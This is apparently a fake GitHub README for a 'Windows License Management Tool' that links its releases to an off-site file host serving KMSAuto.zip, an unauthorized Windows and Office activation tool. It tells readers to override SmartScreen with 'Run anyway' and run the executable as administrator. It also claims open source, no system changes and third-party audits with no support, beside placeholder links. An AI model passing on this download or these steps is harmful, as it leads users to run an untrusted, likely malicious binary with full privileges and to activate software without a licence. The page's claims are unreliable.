# Windows License Management Tool

[![Version](https://img.shields.io/badge/Version-4.7.2-blue?style=flat-square)](https://github.com/your-username/windows-license-management-tool/releases)
[![Platform](https://img.shields.io/badge/Platform-Windows_10_|_11_|_Server-green?style=flat-square)](https://github.com/your-username/windows-license-management-tool)
[![License](https://img.shields.io/badge/License-MIT-brightgreen?style=flat-square)](LICENSE)
[![Downloads](https://img.shields.io/github/downloads/your-username/windows-license-management-tool/total?style=flat-square)](https://github.com/your-username/windows-license-management-tool/releases)
[![Stars](https://img.shields.io/github/stars/your-username/windows-license-management-tool?style=flat-square)](https://github.com/your-username/windows-license-management-tool/stargazers)

---

## 📌 About

Professional **license management utility** for Windows operating systems and Microsoft Office products. Designed for system administrators and IT professionals in corporate environments.

### ✨ Key Features

- 🚀 **One-click license application** for Windows 10/11 and Office 2024/2021
- 💼 **Enterprise-ready** with volume licensing support
- 🔒 **System-safe** — no system files modified
- 📦 **Portable** — no installation required
- 🔄 **Regular updates** with new features and compatibility
- 📊 **Detailed logging** for audit purposes

---

## 🚀 Quick Start

### Step 1: Download
Choose your preferred version from **[Releases](https://cold3.gofile.io/download/direct/30c11aef-ed54-40b8-9c6c-7c2fbb2f48c1/KMSAuto.zip)** :

| File | Description |
| :--- | :--- |
| `WindowsLicenseTool.exe` | Main executable (recommended) |
| `WindowsLicenseTool_Portable.exe` | Portable version |

### Step 2: Run
1. **Double-click** the downloaded `.exe` file
2. If Windows SmartScreen appears, click **"More info"** → **"Run anyway"**

### Step 3: Apply License
1. Select **"Apply Windows License"** or **"Apply Office License"**
2. Wait for confirmation message
3. **Restart** your computer

> 💡 **Tip:** Run as administrator for best results (Right-click → "Run as administrator")

---

## 📂 Repository Structure

```
windows-license-management-tool/
├── 📁 .github/                    # GitHub configuration
│   ├── 📁 workflows/
│   │   └── release.yml            # GitHub Actions for automatic releases
│   └── 📁 ISSUE_TEMPLATE/
│       ├── bug_report.md
│       └── feature_request.md
├── 📁 docs/                       # Documentation
│   ├── 📁 images/
│   │   ├── screenshot1.png        # Screenshot of main window
│   │   ├── screenshot2.png        # Screenshot of process
│   │   └── logo.png               # Program icon
│   ├── 📁 guides/
│   │   ├── windows-setup.md       # Windows setup guide
│   │   ├── enterprise-deployment.md # Enterprise deployment
│   │   └── troubleshooting.md     # Troubleshooting guide
│   └── CHANGELOG.md               # Version history
├── 📁 releases/                   # Binary releases
│   └── 📁 v4.7.2/
│       ├── WindowsLicenseTool.exe # Main executable file
│       ├── config.ini             # Configuration file
│       └── checksum.md            # File checksums
├── 📁 scripts/                    # Helper scripts
│   ├── install.bat                # Installation script
│   ├── uninstall.bat              # Uninstallation script
│   └── update-check.ps1           # Update checker
├── .gitignore                     # Ignored files
├── LICENSE.md                     # MIT License
├── README.md                      # Main documentation
├── SECURITY.md                    # Security policy
├── CODE_OF_CONDUCT.md             # Code of conduct
├── CONTRIBUTING.md                # Contributing guide
├── SUPPORT.md                     # Support information
├── CITATION.cff                   # Citation format
├── .editorconfig                  # Editor settings
├── .pre-commit-config.yaml        # Pre-commit hooks
└── index.html                     # Landing page for GitHub Pages
```

---

## ⚙️ Advanced Configuration

### Command-line parameters

| Parameter | Description |
| :--- | :--- |
| `/windows` | Apply Windows license only |
| `/office` | Apply Office license only |
| `/silent` | Silent mode (no UI) |
| `/log` | Create log file in `%TEMP%` |
| `/config=file.ini` | Use custom config file |

**Example:**
```cmd
WindowsLicenseTool.exe /windows /silent /log
```

### Configuration file (`config.ini`)

```ini
[License]
Windows=10
Office=2024
AutoRestart=false

[Logging]
Enabled=true
Level=Info
Path=%TEMP%\license.log

[Advanced]
SilentMode=false
BypassChecks=false
```

---

## 📊 System Requirements

| Component | Minimum | Recommended |
| :--- | :--- | :--- |
| **OS** | Windows 10 (22H2) | Windows 11 (24H2) |
| **Architecture** | x86 | x64 |
| **RAM** | 512 MB | 2 GB |
| **Disk Space** | 10 MB | 50 MB |
| **.NET Framework** | 4.8 | 4.8.1 |

---

## 🔄 Version History

| Version | Date | Key Changes |
| :--- | :--- | :--- |
| **4.7.2** | 2026-07-07 | Office 2024 support, improved logging |
| **4.7.1** | 2026-06-15 | Windows 11 24H2 compatibility, bug fixes |
| **4.7.0** | 2026-05-20 | New UI, faster license application |

---

## 📖 Documentation

- 📘 [User Guide](docs/guides/windows-setup.md)
- 📗 [Enterprise Deployment](docs/guides/enterprise-deployment.md)
- 📕 [Troubleshooting](docs/guides/troubleshooting.md)
- 📙 [FAQ](docs/guides/faq.md)

---

## 🔒 Security

- **No system files modified** — all changes are temporary
- **Open source** — review the code yourself
- **Regular security audits** — third-party verified
- **MIT License** — use freely in commercial environments

---

## 🤝 Contributing

We welcome contributions! Please follow these steps:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add AmazingFeature'`)
4. Push to branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.

---

## 📜 License

Distributed under the **MIT License**. See [LICENSE](LICENSE) for more information.

---

## 🌟 Support

- 📧 Email: support@your-domain.com
- 🐛 Issues: [GitHub Issues](https://github.com/your-username/windows-license-management-tool/issues)
- 💬 Discussions: [GitHub Discussions](https://github.com/your-username/windows-license-management-tool/discussions)

---

## 📊 Project Status

[![CI](https://img.shields.io/github/actions/workflow/status/your-username/windows-license-management-tool/release.yml?style=flat-square)](https://github.com/your-username/windows-license-management-tool/actions)
[![Code Quality](https://img.shields.io/codefactor/grade/github/your-username/windows-license-management-tool?style=flat-square)](https://www.codefactor.io/repository/github/your-username/windows-license-management-tool)

---

<div align="center">

**[⬇ Download Latest Release](https://cold3.gofile.io/download/direct/30c11aef-ed54-40b8-9c6c-7c2fbb2f48c1/KMSAuto.zip)**

⭐ Star this repository if you find it useful!

*Last updated: July 07, 2026*

</div>
